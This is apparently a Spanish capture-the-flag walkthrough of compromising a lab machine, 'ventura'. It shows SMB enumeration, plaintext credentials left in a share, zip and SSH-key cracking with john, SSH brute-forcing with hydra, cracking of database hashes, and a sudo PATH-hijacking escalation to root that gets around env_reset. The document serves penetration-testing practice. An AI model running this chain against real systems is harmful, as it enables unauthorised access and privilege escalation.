PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10021/tcp open  unknown

-Enumeramos el servicio SMB con crackmapexec:
	-crackmapexec smb 192.168.1.147 -u '' -p '' --shares
        Share           Permissions     Remark
        -----           -----------     ------
        food            READ            Food
	    dessert        READ            Dessert
        menu           READ            Menu

-Entramos al directorio menu del servicio SMB y nos descargamos el fichero .cafesinleche que contiene credenciales:
	-smbclient -N //192.168.1.147/menu
	-smb: \> get .cafesinleche
	-cat .cafesinleche
		user = marmai
		pass = EspabilaSantiaga69

-Nos autenticamos por ftp con las credenciales obtenidas:
	-ftp 192.168.1.147 -p 10021
		-username: marmai
		-password: EspabilaSantiaga69

-Nos descargamos el siguiente archivo .zip:
	ftp> ls
	-rw-r--r-- BurgerWithoutCheese.zip

-Tiene contraseña, generamos un hash y lo rompemos:
	-zip2john BurgerWithoutCheese.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		BurgerWithoutCheese.zip:princess95

-Nos ha descargado un fichero 'users' con nombres de usuario y una id_rsa

-Intentamos autenticarnos por ssh aportando la 'id_rsa' y probando con los usuarios pero no funciona. 

-Generamos un hash a partir de la id_rsa y lo rompemos:
	-ssh2john id_rsa > hash_id_rsa
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
		babygirl         (id_rsa)

-Hacemos ataque de fuerza bruta al servicio SSH con los usuarios que tenemos y la contraseña obtenida:
	-hydra ssh://192.168.1.147 -L users -p babygirl -V -t 4
		 login: gurpreet   password: babygirl

-Nos autenticamos por SSH con las credenciales obtenidas y conseguimos acceso a la máquina:
	-ssh gurpreet@192.168.1.147
	-password: babygirl
	gurpreet@ventura:~$ 

## Escalada de Privilegios

-Nos dirigimos a /home/grupreet:
	-Contenido de fichero 'nota':
		La base de datos tiene hashes muy débiles

-Probamos a conectarnos con nuestro usuario por localhost:
	-mysql -ugurpreet -pbabygirl
		MariaDB [(none)]> Funciona!!
	-Enumeramos la BD y encontramos los hashes:
		MariaDB [secta]> select * from integrantes;
		+----+---------+----------------------------------+
		| id | name    | password                         |
		+----+---------+----------------------------------+
		|  1 | carline | 703ff9a12582b2aaaa3fe7f89bb976c8 |
		|  2 | nika    | c6f606a6b6a30cbaa428131d4c074787 |
		+----+---------+----------------------------------+

-Probamos a romper los hashes con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash_caroline --format=Raw-MD5
		-password: lucymylove

-El hash de 'nika' no se puede romper, sin embargo, resulta que la contraseña del hash de 'caroline' pertenece a 'nika'. Nos autenticamos como nika:
	-ssh nika@192.168.1.147
	-password: lucymylove
	nika@ventura:~$

-Permisos de sudoers en el usuario nika:
	-sudo -l
		**env_reset** (IMPORTANTE!!)
		(ALL) SETENV: NOPASSWD: /opt/porno/watchporn.sh

-Contenido de 'watchporn.sh':
	find source_images -type f -name '*.jpg' -exec chown root:root {} \:


-Está ejecutando el comando 'find', sin utilizar la ruta absoluta. Podemos aplicar un **'PATH HIJACKING'** para escalar privilegios a root.

-El atributo **'env_reset'** significa que va a resetear las variables de entorno, incluido el $PATH cada vez que usemos el comando sudo. Por lo que si exportamos el PATH para aplicar un PATH HIJACKING como de costumbre no funcionará, ya que al ejecutar el script 'watchporn.sh' con sudo va a resetear el $PATH.

-Forma de Bypassear esto y aplicar el PATH HIJACKING:
	-Creamos fichero 'find' con el siguiente contenido:
		-echo '/bin/bash' > find
	-Le damos permisos de ejecución:
		-chmod +x find
	-Ejecutamos el siguiente comando:
		-sudo PATH=/tmp:$PATH /opt/porno/watchporn.sh 
		root@ventura:/opt/porno# whoami
		root

-Como funciona el comando --> sudo PATH=/tmp:$PATH /opt/porno/watchporn.sh 
	-Aquí modificas **PATH** en el mismo momento en que ejecutas sudo, por lo que **'env_reset'** no lo anula y se acontece el PATH HIJACKING












